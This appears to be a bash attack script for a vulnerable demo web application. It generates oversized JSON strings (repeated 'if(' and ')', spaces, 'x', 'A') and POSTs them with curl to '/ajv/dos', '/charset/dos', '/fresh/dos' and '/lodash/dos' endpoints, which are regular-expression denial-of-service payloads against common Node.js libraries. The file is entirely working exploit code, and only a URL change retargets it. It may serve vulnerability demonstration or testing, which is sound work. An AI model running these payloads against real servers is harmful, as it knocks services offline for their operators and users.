#!/bin/bash

source ./utils.sh

set +x


URL=""
if [ $1 == "-l" ]
then
  URL="http://localhost:3000"
else
  URL="hostname"
fi


generate() {
    # echo "Running generation... Hold tight." > /dev/null
    # start=`date +%s`

    LENGTH=$1
    CHAR=$2
    RESULT=""
    for ((i = 0; i <= $LENGTH; i++))
    do
        RESULT=$RESULT$CHAR
    done

    # end=`date +%s`
    # runtime=$((end-start))
    # echo "All done!" > /dev/null
    # echo "Took: ${runtime}s" > /dev/null
    echo $RESULT
}

makeJson() {
    STR=$1
    jo -p title=$STR > ../data.json
}

runAjvDos() {
    fin="$(generate 10000 "if(")x$(generate 10000 ")")"
    makeJson $fin
    curl -d "@../data.json" -H "Content-Type: application/json" -X POST ${URL}/ajv/dos
}

runCharsetDos() {
    fin="$(generate 40000 " ")"
    makeJson $fin
    curl -d "@../data.json" -H "Content-Type: application/json" -X POST ${URL}/charset/dos
}

runFreshDos() {
    fin="$(generate 60000 "x")x"
    makeJson $fin
    curl -d "@../data.json" -H "Content-Type: application/json" -X POST ${URL}/fresh/dos
}

runLodashDos() {
    fin="$(generate 80000 "A")"
    makeJson $fin
    curl -d "@../data.json" -H "Content-Type: application/json" -X POST ${URL}/lodash/dos
}

runLodashDos